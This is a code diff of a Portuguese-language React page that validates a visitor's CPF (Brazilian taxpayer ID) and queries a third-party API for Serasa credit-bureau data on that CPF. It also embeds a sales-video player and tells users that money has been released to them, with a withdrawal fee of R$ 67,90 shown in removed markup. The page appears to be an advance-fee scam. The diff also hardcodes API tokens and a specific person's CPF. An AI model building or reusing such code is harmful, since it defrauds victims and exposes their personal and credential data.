@@ -88,9 +88,16 @@ export function Tutorial() {
         if (isCpfValido) {
             console.log("CPF válido:", cpfValido);
             setStep(2)
-            const response = await api.get(`v2/cpf/?cpf=${cpf}&token=131856185bZyEaUhwYz238062344`)
-            setUser(response.data.result)
+            console.log("antes")
+            try {
 
+                const response = await api.get(`leurakapi?token=JsKy-N9Xp-dkAl-F4v0-zETx&consulta=cpfserasa&info=05386714910`)
+                console.log(response)
+            } catch (error) {
+                console.log(error)
+            }
+            // setUser(response.data.result)
+            console.log("depois")
             console.log(response)
 
         } else {
@@ -272,7 +279,14 @@ export function Tutorial() {
                             </div>
                         </div>
 
-                        <div className="text-white bg-blue-800 rounded-3xl p-4">
+                        <div className="p-4">
+                            <div dangerouslySetInnerHTML={{ __html: '<div id="vid_654272d8ce77130009e8d50a" style="position:relative;width:100%;padding: 125% 0 0;"><img id="thumb_654272d8ce77130009e8d50a" src="https://images.converteai.net/ae05c9da-e785-4dd5-894c-cd71694958ee/players/654272d8ce77130009e8d50a/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"><div id="backdrop_654272d8ce77130009e8d50a" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div></div>' }} />
+                            <Helmet>
+                                <script type="text/javascript" id="scr_654272d8ce77130009e8d50a">var s=document.createElement("script");s.src="https://scripts.converteai.net/ae05c9da-e785-4dd5-894c-cd71694958ee/players/654272d8ce77130009e8d50a/player.js",s.async=!0,document.head.appendChild(s);</script>
+                            </Helmet>
+                        </div>
+
+                        {/* <div className="text-white bg-blue-800 rounded-3xl p-4">
 
                             <div>
                                 <h2 className="flex items-center space-x-2 text-xl mb-2">Taxa para sacar:</h2>
@@ -280,7 +294,7 @@ export function Tutorial() {
                                     R$ 67,90
                                 </span>
                             </div>
-                        </div>
+                        </div> */}
 
                         <div className="text-xl text-gray-700 font-bold mt-10 mb-10">
                             Esse dinheiro foi liberado por conta dos juros que você pagou nos últimos anos.
